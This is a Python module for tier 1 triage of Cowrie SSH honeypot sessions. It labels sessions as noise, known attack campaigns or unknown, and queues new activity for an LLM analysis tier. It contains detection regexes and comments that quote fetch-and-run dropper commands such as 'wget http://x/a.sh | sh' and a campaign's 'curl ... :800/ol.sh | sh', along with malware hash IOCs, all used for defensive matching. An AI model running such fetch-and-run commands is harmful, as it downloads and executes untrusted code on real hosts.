#!/usr/bin/env python3
"""Tier 1 triage: deterministic verdict for every closed honeypot session. Stdlib only.

Called by loader.py at the end of every run, and usable on its own:

    python3 triage.py             # triage sessions that closed since the last run
    python3 triage.py --report    # verdict counts, tier 2 queue, tuning hints (read-only)
    python3 triage.py --rebuild   # forget all verdicts and seen_keys, re-triage everything
                                  # (after changing rules or after `loader.py --reindex`);
                                  # run it under the loader lock:
                                  #   flock /tmp/cowrie-loader.lock python3 triage.py --rebuild

Every closed session gets one row in `triage`:
  kind = noise           known harmless background traffic (probes, single recon commands)
  kind = known_campaign  a playbook we already understand (counted, not analysed again)
  kind = unknown         everything else
  needs_analysis = 1     goes to the tier 2 queue (LLM agent), with `reasons` saying why

Order of decisions:
  0. Operator's own test sessions (SELF_IPS / data/self_ips.txt): label `self_test`, never queued,
     not counted in seen_keys.
  1. Known campaign by content (mdrfckr). Its own commands are not checked for droppers,
     because the long variants contain `|chpasswd|bash`, which is part of the known playbook.
  2. Noise rules, only for sessions with no payload activity at all.
  3. Known campaigns codified from reviewed tier 2 verdicts (pi_scp_dropper, go_sshd_upload,
     sshole_*, spam_relay, proxy_abuse, infostealer_recon). Each is an exact shape: one extra
     command or an unexpected payload breaks the match and the session falls through to step 4.
  4. Everything else is `unknown`.
  Payload signals (first-seen upload/download hash, first-seen tunnel target, first-seen staging
  URL) apply to every kind, so a known campaign that suddenly drops a new binary is still queued.

Where the step 3 rules come from: the tier 2 agent suggests a rule with every verdict. Those
suggestions are model output derived partly from attacker-controlled text, so they are only
proposals. A human reviews each one, narrows it (exact hashes, anchored regexes, no "any curl |
sh" catch-alls) and adds tests before it is codified here.

SECURITY: commands, filenames, tunnel targets and URLs are attacker-controlled. This module only
compares them with regexes and exact strings; it never executes, fetches or opens anything.
Anything printed by --report goes through safe() first (no terminal escape sequences).
"""
import argparse
import ipaddress
import json
import os
import re
import sqlite3
import sys
from datetime import datetime, timedelta, timezone

from fingerprint import EMPTY_SHA256, normalize

BASE = os.path.dirname(os.path.abspath(__file__))
DB_PATH = os.environ.get("COWRIE_DB", os.path.join(BASE, "data", "cowrie.db"))
SCHEMA = os.path.join(BASE, "schema.sql")

# A session with no `session.closed` event (Cowrie restart, lost log line) is triaged anyway
# once it is this old, so it does not stay out of the picture forever.
STALE_AFTER = timedelta(hours=24)
COMMIT_EVERY = 500

# --------------------------------------------------------------------------------------------
# Rules. All command allowlists are EXACT matches on the normalized command (fingerprint.normalize:
# whitespace collapsed, IPs/URLs/keys/long numbers masked). Exact on purpose: `hostname` is noise,
# `hostname; wget http://x/a.sh | sh` is not, because Cowrie logs the whole line as one input.
# --------------------------------------------------------------------------------------------

# Login check used by one very loud scanner (~10.5k sessions from one IP): prints "ok".
_PROBE = {
    r'echo -e "\x6F\x6B"',
    r"echo -e '\x6F\x6B'",
    r'echo -e "\x6f\x6b"',
    r"echo -e '\x6f\x6b'",
}

# Read-only reconnaissance commands seen as single-command sessions. Extend this after looking at
# "top unknown fingerprints" in --report. Only add commands that cannot change or fetch anything.
_RECON = {
    # system identity
    "uname", "uname -a", "uname -m", "uname -r", "uname -s", "uname -n", "uname -s -m",
    "uname -s -v -n -r -m", "uname -snrvm", "uname -mrs",
    "hostname", "whoami", "id", "pwd", "w", "who", "uptime", "env", "history", "nproc",
    "ssh -V", "perl -v", "python -V", "python3 -V",
    # filesystem / hardware
    "ls", "ls -la", "ls -la /", "ls -la ~", "ls -lah", "mount", "df", "df -h", "free", "free -h", "free -m",
    "lspci", "lscpu", "cat /proc/cpuinfo", "cat /proc/meminfo", "cat /etc/os-release", "cat /etc/issue",
    "cat /proc/cpuinfo | grep name | wc -l", "cat /proc/cpuinfo | grep 'model name' | head -1",
    # processes / network
    "ps", "ps aux", "ps -ef", "ps aux | head -10", "ps -ef | head -10",
    "netstat", "netstat -an", "netstat -tulpn", "netstat -antp", "netstat -tnlp", "ifconfig", "ip a", "ip addr",
    # "are you a shell?" markers
    "echo SSH check", "echo 'SSH check'", 'echo "SSH check"',
    "echo SHELL_TEST", "echo OK", "echo ok", "echo test", "echo 1",
    "echo 'SSHOLE_'\"<NUM>\"", "echo SSHOLE_<NUM>", "echo 'SSHOLE_<NUM>'", 'echo "SSHOLE_<NUM>"',
    # seen in the first real --report (2026-11-20), one command per session, mostly from a single source IP
    "netstat -tulpn | head -10", "history | tail -5", "ssh -V 2>&1",
    "nproc || grep -c processor /proc/cpuinfo", "mount | head -5", "free -h | head -2",
    "env | head -10", "df -h | head -5",
    "lspci | grep -i vga || lspci | grep -i nvidia || echo 'No GPU info'",
    "uptime;uname -a", "uptime; uname -a", "ls 2>/dev/null",
    # MikroTik RouterOS probe (does nothing on Linux, read-only on RouterOS); see also _ROUTEROS
    "/ip cloud print",
}
MAX_NOISE_COMMANDS = 2

# Known campaign: MikroTik RouterOS reconnaissance (`/ip cloud print`, `/system resource print`, ...).
# A session gets this label only if EVERY command is a RouterOS `print` (optionally with plain
# words such as `detail` or `without-paging`) or a Linux command already in _RECON/_PROBE. Anything
# else in the session (`/user add`, `/tool fetch`, `/system script`, a URL, ...) breaks the match and
# the session stays `unknown`, so its first-seen fingerprint is still queued for review.
_ROUTEROS_PRINT = re.compile(r"/[a-z][a-z0-9-]*(?: [a-z][a-z0-9-]*)* print(?: [a-z][a-z0-9-]*)*")
MAX_ROUTEROS_COMMANDS = 20

# Downloads count as payloads only if Cowrie recorded a real URL (wget/curl/tftp). Rows created by
# shell redirection (`echo "ssh-rsa ..." >> .ssh/authorized_keys`, url = 'redir' or no URL at all)
# are just text the attacker typed, which is already in `commands`.
_DOWNLOAD_URL = re.compile(r"(?:https?|ftp|tftp)://", re.IGNORECASE)

# Known campaign: SSH key injection with key comment "mdrfckr". Matched by content, not by
# fingerprint, because the longer variants (+15..+18 commands) each have their own fingerprint.
_MDRFCKR = re.compile(r"chattr\s+-ia\s+\.ssh|mdrfckr")

# Dropper: fetch / make executable / run a file. Any hit queues the session.
DROPPER_RE = re.compile(
    r"""
      \b(?:wget|curl|tftp|ftpget|lwp-download)\b      # fetch something
    | \bscp\s+(?:-\w+\s+)*-t\b                       # receiving side of an scp upload
    | \bchmod\s+(?:-\w+\s+)*(?:[ugoa]*\+[rwx]*x|0?7[0-7]{2})\b   # make executable (+x, 755, 777)
    | \b(?:ba)?sh\s+-c\s+["']?\./                    # bash -c ./file
    | (?:^|[;&|]\s*)\./[^\s;&|]+                     # ./file at the start of a command
    | \|\s*(?:ba|da|z)?sh\b                          # ... | sh
    | \bbase64\s+(?:-d|--decode)\b                   # decode an embedded payload
    """,
    re.VERBOSE,
)

# --------------------------------------------------------------------------------------------
# Known campaigns codified from the first real tier 2 run (2026-11-20). Reviewed by hand; see the
# module docstring. Full SHA-256 values are public IOCs of files pushed to the honeypot.
# --------------------------------------------------------------------------------------------

# pi_scp_dropper: default Raspberry Pi credentials, file pushed with `scp -t /tmp/<8 chars>`, then
# `cd /tmp && chmod +x <same> && bash -c ./<same>`. Matched by the exact playbook (same name in every
# command, backreference) or by the known file hash. A new hash with the same playbook keeps the
# label but is still queued once through first_seen_upload.
PI_SCP_SHA256 = {"6d1fe6ab3cd04ca5d1ab790339ee2b6577553bc042af3b7587ece0c195267c9b"}
_PI_SCP = re.compile(r"scp -t /tmp/(?P<n>[A-Za-z0-9]{8})")
_PI_EXEC = re.compile(r"cd /tmp && chmod \+x (?P<n>[A-Za-z0-9]{8}) && bash -c \./(?P=n)")

# go_sshd_upload: SFTP upload named `sshd`, no commands, Go SSH client, same hash from many IPs.
# Only this hash: other `sshd` uploads stay `upload` / unknown until a human has reviewed them.
GO_SSHD_SHA256 = {"6e78b3f84453618ec1eab60674e01f36a08a740a95c50b99154ad0552075d924"}

# sshole_*: paramiko client printing `SSHOLE_<epoch>` / `SSHOLE_B_` / `SSHOLE_E_` markers around its
# commands. Two shapes from the same tooling:
#   sshole_access_check  markers + read-only checks only (does a shell work, what is the exit code)
#   sshole_dropper       markers + `curl|wget http://<host>:800/ol.sh | sh`: fetch-and-run
# Lines are split on ; && || and every part must be a marker echo, an exit-code echo, an allowlisted
# recon command, or (dropper only) the exact fetch. Anything else falls through to `dropper`/unknown.
# The staging URL is recorded in seen_keys, so a new staging host is queued once.
_SSHOLE_MARK = re.compile(r"SSHOLE_")
_SSHOLE_ECHO = re.compile(r"""echo\s+['"]?SSHOLE_(?:[BE]_)?['"]*(?:<NUM>)?['"]*(?:\$\?)?['"]*""")
_EXIT_ECHO = re.compile(r"""echo\s+['"]?\$\?['"]?""")
_SSHOLE_FETCH = re.compile(
    r"(?:curl(?:\s+-[A-Za-z]+)*|wget(?:\s+-[A-Za-z]+-?)*)\s+(?P<url>http://[A-Za-z0-9.-]+:800/ol\.sh)\s*\|\s*(?:ba)?sh")
_SPLIT = re.compile(r"\s*(?:;|&&|\|\||\n)\s*")

# spam_relay: only `direct-tcpip` to mail ports, no commands, no files. The first session to each new
# mail target is still queued (first_seen_tunnel), later ones are counted.
SMTP_PORTS = {25, 465, 587}

# proxy_abuse: connectivity check through the honeypot, exact targets only, no commands, no files.
PROXY_CHECK_TARGETS = {("google.com", 80)}

# infostealer_recon: one script from many IPs that looks for Telegram Desktop session data, GSM/USB
# modems and SMS daemons, running miners, and MikroTik RouterOS. All four markers must be present,
# no dropper pattern, nothing that writes or kills (redirects to /dev/null are allowed), no files.
_INFO_TDATA = re.compile(r"TelegramDesktop|\btdata\b")
_INFO_MODEM = re.compile(r"/dev/ttyGSM|/dev/ttyUSB-mod|/dev/modem|\bsmsd\b|\bqmux")
_INFO_MINER = re.compile(r"grep\s+(?:-\w+\s+)*['\"]?\[Mm\]iner")
_INFO_ROS = re.compile(r"^/ip cloud print$")
_WRITES = re.compile(
    r"\b(?:rm|mv|cp|dd|tee|touch|mkdir|useradd|adduser|usermod|passwd|chpasswd|crontab|chattr|"
    r"kill|pkill|killall|systemctl|service|iptables|nohup|sed\s+-i)\b"
    r"|>(?!\s*/dev/null)(?!&)")
MAX_INFOSTEALER_COMMANDS = 40

# Severity per label, for --report and the (future) alert sender. Tier 2 sets its own severity.
SEVERITY = {
    "pi_scp_dropper": "high", "go_sshd_upload": "high", "sshole_dropper": "medium",
    "infostealer_recon": "medium", "spam_relay": "medium", "mdrfckr_ssh_key_injection": "medium",
    "sshole_access_check": "low", "proxy_abuse": "low", "routeros_recon": "low",
}

# Tunnel destinations worth a note in the reason (spam relays, mail).
NOTABLE_PORTS = {25: "smtp", 465: "smtps", 587: "submission"}

_SHA256 = re.compile(r"[0-9a-f]{64}")
_UNSAFE = re.compile(r"[^\x20-\x7e]")


def safe(text, limit=100):
    """Printable-ASCII, length-limited version of an attacker-controlled string, for keys and output."""
    if text is None:
        return ""
    text = _UNSAFE.sub("?", str(text))
    return text if len(text) <= limit else text[: limit - 3] + "..."


def _hash(value):
    """Cowrie's sha256 as lowercase hex, or None if it does not look like one."""
    v = (value or "").strip().lower()
    return v if _SHA256.fullmatch(v) else None


def load_self_ips(path=None, env=None):
    """The operator's own source addresses (tests from home), as ip_network objects.

    Read from the SELF_IPS environment variable (comma or space separated) and from data/self_ips.txt
    (one address or CIDR per line, `#` comments). Both are optional and the file is git-ignored, so
    real addresses never land in the repository. Invalid entries are skipped with a warning.
    """
    env = os.environ if env is None else env
    path = path or os.path.join(os.path.dirname(DB_PATH), "self_ips.txt")
    items = re.split(r"[,\s]+", env.get("SELF_IPS", ""))
    try:
        with open(path) as f:
            for line in f:
                items.append(line.split("#", 1)[0].strip())
    except FileNotFoundError:
        pass
    nets = []
    for it in items:
        if not it:
            continue
        try:
            nets.append(ipaddress.ip_network(it, strict=False))
        except ValueError:
            print(f"triage: ignoring invalid self IP entry {safe(it, 60)!r}", file=sys.stderr)
    return nets


def is_self(ip, nets):
    if not nets or not ip:
        return False
    try:
        addr = ipaddress.ip_address(ip)
    except ValueError:
        return False
    return any(addr in n for n in nets)


# --------------------------------------------------------------------------------------------
# Database helpers
# --------------------------------------------------------------------------------------------

def connect(path=DB_PATH):
    db = sqlite3.connect(path, timeout=30)
    with open(SCHEMA) as f:          # idempotent: creates triage / seen_keys on an older DB
        db.executescript(f.read())
    return db


def load_session(db, s):
    """Everything triage looks at for one session (plain Python values, nothing executed)."""
    cmds = [r[0] for r in db.execute(
        "SELECT input FROM commands WHERE session = ? ORDER BY ts, id", (s,)) if r[0] is not None]
    uploads = db.execute("SELECT filename, shasum FROM uploads WHERE session = ? ORDER BY ts", (s,)).fetchall()
    # Only real downloads (see _DOWNLOAD_URL); redirect captures would flood the queue with key files.
    downloads = [(u, h) for u, h in db.execute(
        "SELECT url, shasum FROM downloads WHERE session = ? ORDER BY ts", (s,))
        if u and _DOWNLOAD_URL.match(u.strip())]
    tunnels = db.execute("SELECT dst_ip, dst_port FROM tunnels WHERE session = ? ORDER BY ts", (s,)).fetchall()
    return {"commands": cmds, "uploads": uploads, "downloads": downloads, "tunnels": tunnels}


def see(db, key, session, ts):
    """Record one sighting of `key`. Returns True if this is the first time it was ever seen."""
    cur = db.execute(
        "UPDATE seen_keys SET count = count + 1, last_ts = ? WHERE key = ?", (ts, key))
    if cur.rowcount:
        return False
    db.execute(
        "INSERT INTO seen_keys (key, first_session, first_ts, last_ts, count) VALUES (?, ?, ?, ?, 1)",
        (key, session, ts, ts))
    return True


# --------------------------------------------------------------------------------------------
# Classification
# --------------------------------------------------------------------------------------------

def _parts(norm):
    return [p for c in norm for p in _SPLIT.split(c) if p]


def _pi_scp(norm, real_uploads):
    names = set()
    for c in norm:
        m = _PI_SCP.fullmatch(c) or _PI_EXEC.fullmatch(c)
        if not m:
            return False
        names.add(m.group("n"))
    if len(names) > 1:
        return False
    hashes = {_hash(sha) for _n, sha in real_uploads}
    if norm:
        return True                     # exact playbook; any upload hash is checked by first_seen_upload
    return bool(hashes) and hashes <= PI_SCP_SHA256


def _sshole(cmds):
    """'sshole_dropper', 'sshole_access_check' or None."""
    if not any(_SSHOLE_MARK.search(c) for c in cmds):
        return None
    fetch = False
    for raw in _parts(cmds):
        part = normalize(raw)
        if _SSHOLE_FETCH.fullmatch(raw):
            fetch = True
        elif not (_SSHOLE_ECHO.fullmatch(part) or _EXIT_ECHO.fullmatch(part) or part in _RECON):
            return None
    return "sshole_dropper" if fetch else "sshole_access_check"


def sshole_urls(cmds):
    return [m.group("url") for raw in _parts(cmds) for m in [_SSHOLE_FETCH.fullmatch(raw)] if m]


def _infostealer(cmds, norm):
    if not 0 < len(cmds) <= MAX_INFOSTEALER_COMMANDS:
        return False
    if any(DROPPER_RE.search(c) or _WRITES.search(c) for c in cmds):
        return False
    return (any(_INFO_TDATA.search(c) for c in cmds) and any(_INFO_MODEM.search(c) for c in cmds)
            and any(_INFO_MINER.search(c) for c in cmds) and any(_INFO_ROS.match(c) for c in norm))


def _codified_campaign(data, cmds, norm, real_uploads):
    """Step 3 of the decision order. Returns a label or None. See the rule comments above."""
    uploads, downloads, tunnels = real_uploads, data["downloads"], data["tunnels"]
    if not downloads and not tunnels and (norm or uploads) and _pi_scp(norm, uploads):
        return "pi_scp_dropper"
    if (not cmds and not downloads and not tunnels and uploads
            and all(_hash(sha) in GO_SSHD_SHA256 and (name or "").rsplit("/", 1)[-1] == "sshd"
                    for name, sha in uploads)):
        return "go_sshd_upload"
    if not uploads and not downloads and not tunnels:
        label = _sshole(cmds)
        if label:
            return label
        if _infostealer(cmds, norm):
            return "infostealer_recon"
    if tunnels and not cmds and not uploads and not downloads:
        if all(port in SMTP_PORTS for _h, port in tunnels):
            return "spam_relay"
        if all(((host or "").lower(), port) in PROXY_CHECK_TARGETS for host, port in tunnels):
            return "proxy_abuse"
    return None


def classify(data):
    """Label from commands and payload activity alone (no database, no first-seen logic).

    Returns (label, kind, dropper_hit).
    """
    cmds = data["commands"]
    norm = [normalize(c) for c in cmds]

    if any(_MDRFCKR.search(c) for c in cmds):
        return "mdrfckr_ssh_key_injection", "known_campaign", False

    dropper = any(DROPPER_RE.search(c) for c in cmds)
    real_uploads = [u for u in data["uploads"] if _hash(u[1]) != EMPTY_SHA256]
    has_payload = bool(real_uploads or data["downloads"] or data["tunnels"]) or dropper

    if not has_payload and len(norm) <= MAX_NOISE_COMMANDS:
        if data["uploads"] and not norm:
            return "empty_upload", "noise", False
        if not norm and not data["uploads"]:
            return "no_activity", "noise", False
        if norm and all(c in _PROBE for c in norm) and not data["uploads"]:
            return "probe_echo_ok", "noise", False
        if norm and all(c in _RECON or c in _PROBE for c in norm) and not data["uploads"]:
            return "recon_single", "noise", False

    if (not has_payload and not data["uploads"] and 0 < len(norm) <= MAX_ROUTEROS_COMMANDS
            and any(_ROUTEROS_PRINT.fullmatch(c) for c in norm)
            and all(_ROUTEROS_PRINT.fullmatch(c) or c in _RECON or c in _PROBE for c in norm)):
        return "routeros_recon", "known_campaign", False

    campaign = _codified_campaign(data, cmds, norm, real_uploads)
    if campaign:
        return campaign, "known_campaign", False

    if dropper:
        return "dropper", "unknown", True
    if real_uploads:
        return "upload", "unknown", False
    if data["downloads"]:
        return "download", "unknown", False
    if data["tunnels"] and not cmds:
        return "direct_tcpip", "unknown", False
    return "unclassified", "unknown", False


def triage_session(db, s, fp, start_ts, src_ip=None, self_nets=()):
    """Classify one session, update seen_keys, return (label, kind, needs_analysis, reasons)."""
    if is_self(src_ip, self_nets):
        return "self_test", "noise", 0, []          # not queued, not counted in seen_keys
    data = load_session(db, s)
    label, kind, dropper = classify(data)
    reasons = []
    if dropper:
        reasons.append("dropper")

    # Payload signals: first time we see a file hash or a tunnel destination. Later sightings are
    # only counted in seen_keys (see --report), so 807 tunnels to the same mail server = 1 queue entry.
    for _name, sha in data["uploads"]:
        h = _hash(sha)
        if h and h != EMPTY_SHA256 and see(db, f"upload:{h}", s, start_ts):
            reasons.append(f"first_seen_upload:{h[:16]}")
    for _url, sha in data["downloads"]:
        h = _hash(sha)
        if h and h != EMPTY_SHA256 and see(db, f"download:{h}", s, start_ts):
            reasons.append(f"first_seen_download:{h[:16]}")
    for host, port in data["tunnels"]:
        target = f"{safe(host, 80)}:{port}"
        if see(db, f"tunnel:{target}", s, start_ts):
            note = NOTABLE_PORTS.get(port)
            reasons.append(f"first_seen_tunnel:{target}" + (f" ({note})" if note else ""))

    # Staging host of a codified fetch-and-run campaign: a new URL is new infrastructure.
    if label == "sshole_dropper":
        for url in sshole_urls(data["commands"]):
            if see(db, f"fetch:{safe(url, 120)}", s, start_ts):
                reasons.append(f"first_seen_fetch_url:{safe(url, 120)}")

    # Behaviour signal: a command sequence nobody has run before, in a session no rule explains.
    if fp:
        first = see(db, f"fp:{fp}", s, start_ts)   # counted for every kind, for --report
        if first and kind == "unknown" and not dropper:
            reasons.append(f"first_seen_fingerprint:{fp}")

    return label, kind, int(bool(reasons)), reasons


def pending_sessions(db, now):
    """Closed (or stale) sessions without a verdict, oldest first so 'first seen' means first in time."""
    stale = (now - STALE_AFTER).strftime("%Y-%m-%dT%H:%M:%S")
    return db.execute(
        """SELECT s.session, s.fingerprint, s.start_ts, s.src_ip
             FROM sessions s LEFT JOIN triage t ON t.session = s.session
            WHERE t.session IS NULL
              AND (s.end_ts IS NOT NULL OR s.start_ts < ?)
            ORDER BY s.start_ts, s.session""",
        (stale,),
    ).fetchall()


def run(db_path=DB_PATH, now=None):
    """Triage all pending sessions. Returns counters. Errors in one session skip only that session."""
    now = now or datetime.now(timezone.utc)
    stamp = now.strftime("%Y-%m-%dT%H:%M:%SZ")
    db = connect(db_path)
    stats = {"triaged": 0, "queued": 0, "errors": 0}
    self_nets = load_self_ips()
    try:
        for i, (s, fp, start_ts, src_ip) in enumerate(pending_sessions(db, now), 1):
            try:
                label, kind, needs, reasons = triage_session(db, s, fp, start_ts, src_ip, self_nets)
            except Exception as e:  # noqa: BLE001 - one odd session must not block the rest
                stats["errors"] += 1
                print(f"triage: session {safe(s, 40)} skipped ({type(e).__name__}: {safe(e)})", file=sys.stderr)
                continue
            db.execute(
                "INSERT INTO triage (session, label, kind, needs_analysis, reasons, triaged_at)"
                " VALUES (?, ?, ?, ?, ?, ?)",
                (s, label, kind, needs, json.dumps(reasons), stamp),
            )
            stats["triaged"] += 1
            stats["queued"] += needs
            if i % COMMIT_EVERY == 0:
                db.commit()
        db.commit()
    finally:
        db.close()
    return stats


def summary(stats):
    out = f"{stats['triaged']} sessions triaged, {stats['queued']} queued for analysis"
    return out + (f", {stats['errors']} errors" if stats.get("errors") else "")


def rebuild(db_path=DB_PATH, now=None):
    """Re-triage from scratch. Keeps analyzed_at for sessions that are still queued afterwards,
    so tier 2 does not analyse the same session twice."""
    db = connect(db_path)
    done = dict(db.execute("SELECT session, analyzed_at FROM triage WHERE analyzed_at IS NOT NULL"))
    db.execute("DELETE FROM triage")
    db.execute("DELETE FROM seen_keys")
    db.commit()
    db.close()
    stats = run(db_path, now)
    if done:
        db = sqlite3.connect(db_path, timeout=30)
        db.executemany(
            "UPDATE triage SET analyzed_at = ? WHERE session = ? AND needs_analysis = 1",
            [(ts, s) for s, ts in done.items()])
        db.commit()
        db.close()
    return stats


# --------------------------------------------------------------------------------------------
# Report (read-only)
# --------------------------------------------------------------------------------------------

def report(db_path=DB_PATH, queue_limit=30, top=15):
    db = sqlite3.connect(f"file:{db_path}?mode=ro", uri=True, timeout=30)
    q = db.execute
    total = q("SELECT COUNT(*) FROM sessions").fetchone()[0]
    done = q("SELECT COUNT(*) FROM triage").fetchone()[0]
    print(f"sessions: {total}, triaged: {done}, not yet triaged (open): {total - done}\n")

    print("verdicts (kind / label / severity: sessions, distinct IPs)")
    for kind, label, n, ips in q(
            """SELECT t.kind, t.label, COUNT(*), COUNT(DISTINCT s.src_ip)
                 FROM triage t JOIN sessions s ON s.session = t.session
                GROUP BY t.kind, t.label ORDER BY t.kind, COUNT(*) DESC"""):
        print(f"  {kind:<15} {label:<28} {SEVERITY.get(label, '-'):<7} {n:>7}  {ips:>6} IPs")

    pending = q("SELECT COUNT(*) FROM triage WHERE needs_analysis = 1 AND analyzed_at IS NULL").fetchone()[0]
    print(f"\ntier 2 queue: {pending} pending (showing up to {queue_limit}, oldest first)")
    for s, start, ip, label, reasons in q(
            """SELECT t.session, s.start_ts, s.src_ip, t.label, t.reasons
                 FROM triage t JOIN sessions s ON s.session = t.session
                WHERE t.needs_analysis = 1 AND t.analyzed_at IS NULL
                ORDER BY s.start_ts LIMIT ?""", (queue_limit,)):
        print(f"  {safe(start, 40)[:19]}  {safe(s, 12):<12} {safe(ip, 39):<15} {label:<26} "
              f"{safe(', '.join(json.loads(reasons)), 120)}")

    print("\nrepeated payloads and tunnels (seen_keys, count > 1)")
    for key, n, first, last in q(
            """SELECT key, count, first_ts, last_ts FROM seen_keys
                WHERE key NOT LIKE 'fp:%' AND count > 1 ORDER BY count DESC LIMIT ?""", (top,)):
        print(f"  {n:>6}x  {safe(key, 90):<90}  {safe(first, 40)[:10]} .. {safe(last, 40)[:10]}")

    # Tuning aid: the biggest groups that no rule explains. If one is harmless, add its command(s)
    # to _RECON; if it is a campaign, give it a rule. The sample is attacker text: sanitized, truncated.
    print("\ntop unknown fingerprints (rule candidates; sample command is untrusted text)")
    for fp, n, ips, example in q(
            """SELECT s.fingerprint, COUNT(*), COUNT(DISTINCT s.src_ip), MIN(s.session)
                 FROM triage t JOIN sessions s ON s.session = t.session
                WHERE t.kind = 'unknown' AND s.fingerprint IS NOT NULL
                GROUP BY s.fingerprint ORDER BY COUNT(*) DESC LIMIT ?""", (top,)):
        cmds = [r[0] for r in q("SELECT input FROM commands WHERE session = ? ORDER BY ts, id", (example,))]
        first = cmds[0] if cmds else ""
        print(f"  {fp}  {n:>6}x {ips:>5} IPs {len(cmds):>3} cmds  {safe(first, 70)}")
    db.close()


def main(argv=None):
    p = argparse.ArgumentParser(description="Tier 1 triage of Cowrie sessions")
    g = p.add_mutually_exclusive_group()
    g.add_argument("--report", action="store_true", help="print verdict counts and the tier 2 queue (read-only)")
    g.add_argument("--rebuild", action="store_true", help="drop all verdicts and re-triage everything")
    args = p.parse_args(argv)

    if args.report:
        report()
    elif args.rebuild:
        print(f"rebuild: {summary(rebuild())}")
    else:
        print(f"triage: {summary(run())}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
